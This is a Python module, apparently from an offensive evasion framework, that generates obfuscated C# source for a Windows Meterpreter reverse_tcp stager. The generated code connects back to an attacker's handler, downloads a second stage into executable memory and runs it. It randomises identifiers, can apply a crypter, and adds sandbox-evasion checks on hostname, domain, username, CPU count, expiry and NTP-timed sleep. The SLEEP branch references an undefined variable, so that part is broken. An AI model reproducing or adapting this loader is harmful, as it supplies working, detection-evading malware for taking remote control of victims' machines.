"""

Custom-written pure c# meterpreter/reverse_tcp stager.
Uses basic variable renaming obfuscation.

Module built by @harmj0y
Updated by @ChrisTruncer and @evan_pena2003

"""

from lib.common import helpers
from Tools.Evasion.evasion_common import encryption


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Excellent"
        self.name = "Pure C# Reverse TCP Stager"
        self.path = "cs/meterpreter/rev_tcp"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "LHOST"            : ["", "IP of the Metasploit handler"],
                                    "LPORT"            : ["4444", "Port of the Metasploit handler"],
                                    "COMPILE_TO_EXE"   : ["Y", "Compile to an executable"],
                                    "USE_ARYA"         : ["N", "Use the Arya crypter"],
                                    "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "USERNAME"       : ["X", "Optional: The required user account"],
                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                }



    def generate(self):

        getDataName = helpers.randomString()
        injectName = helpers.randomString()

        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
        payload_code += "namespace %s { class %s {\n" % (helpers.randomString(), helpers.randomString())

        hostName = helpers.randomString()
        portName = helpers.randomString()
        ipName = helpers.randomString()
        sockName = helpers.randomString()
        length_rawName = helpers.randomString()
        lengthName = helpers.randomString()
        sName = helpers.randomString()
        total_bytesName = helpers.randomString()
        handleName = helpers.randomString()

        payload_code += "static byte[] %s(string %s, int %s) {\n" %(getDataName, hostName, portName)
        payload_code += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
        payload_code += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
        payload_code += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
        payload_code += "    catch { return null;}\n"
        payload_code += "    byte[] %s = new byte[4];\n" %(length_rawName)
        payload_code += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
        payload_code += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
        payload_code += "    byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
        payload_code += "    int %s = 0;\n" %(total_bytesName)
        payload_code += "    while (%s < %s)\n" %(total_bytesName, lengthName)
        payload_code += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
        payload_code += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
        payload_code += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
        payload_code += "    return %s;}\n" %(sName)


        sName = helpers.randomString()
        funcAddrName = helpers.randomString()
        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "static void %s(byte[] %s) {\n" %(injectName, sName)
            payload_code += "    if (%s != null) {\n" %(sName)
            payload_code += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
            payload_code += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
            payload_code += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
            payload_code += "        UInt32 %s = 0;\n" %(threadIdName)
            payload_code += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
            payload_code += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
            payload_code += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":

            payload_code += "static void %s(byte[] %s) {\n" %(injectName, sName)
            payload_code += "    if (%s != null) {\n" %(sName)
            payload_code += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, sName)
            payload_code += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, sName)
            payload_code += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, sName, sName)
            payload_code += '       UInt32 {} = 0;\n'.format(threadIdName)
            payload_code += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
            payload_code += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)


        sName = helpers.randomString()
        randomName = helpers.randomString()
        curlyCount = 0
        payload_code += "static void Main(){\n"

        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = helpers.randomString()
            RandExpire = helpers.randomString()            

            # Create Payload code
            payload_code += '\t' * curlyCount + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
            payload_code += '\t' * curlyCount + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, self.required_options["EXPIRE_PAYLOAD"][0])
            payload_code += '\t' * curlyCount + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)

            # Add a tab for this check
            curlyCount += 1            

        if self.required_options["HOSTNAME"][0].lower() != "x":            

            payload_code += '\t' * curlyCount + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(self.required_options["HOSTNAME"][0].lower())            

            # Add a tab for this check
            curlyCount += 1

        if self.required_options["DOMAIN"][0].lower() != "x":

            payload_code += '\t' * curlyCount + 'if (System.Environment.MachineName.ToLower() != System.Environment.UserDomainName.ToLower()) {\n'                        

            # Add a tab for this check
            curlyCount += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":

            payload_code += '\t' * curlyCount + 'if (System.Environment.ProcessorCount > {}) {{\n'.format(self.required_options["PROCESSORS"][0])

            # Add a tab for this check
            curlyCount += 1

        if self.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = helpers.randomString()
            rand_char_name = helpers.randomString()
            
            payload_code += '\t' * curlyCount + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
            payload_code += '\t' * curlyCount + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
            payload_code += '\t' * curlyCount + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, self.required_options["USERNAME"][0])            

            # Add a tab for this check
            curlyCount += 1

        if self.required_options["SLEEP"][0].lower() != "x":
            
            payload_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
            payload_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            payload_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
            payload_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
            payload_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
            payload_code += '\t' * num_tabs_required + 'Thread.Sleep(' + self.required_options["SLEEP"][0] + '*1000);\n'
            payload_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            payload_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
            payload_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
            payload_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + self.required_options["SLEEP"][0] + ' || skip) {\n'

            # Add a tab for this check
            curlyCount += 1

        payload_code += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0])
        payload_code += "    %s(%s); }\n" %(injectName, sName)

        while (curlyCount != 0):
            payload_code += '\t' * curlyCount + '}'
            curlyCount -= 1

        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in range(12)]
        y = [helpers.randomString() for x in range(17)] 
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual": payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);}}\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap": payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);}}\n"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])        

        if self.required_options["USE_ARYA"][0].lower() == "y":
            payload_code = encryption.arya(payload_code)

        self.payload_source_code = payload_code
        return
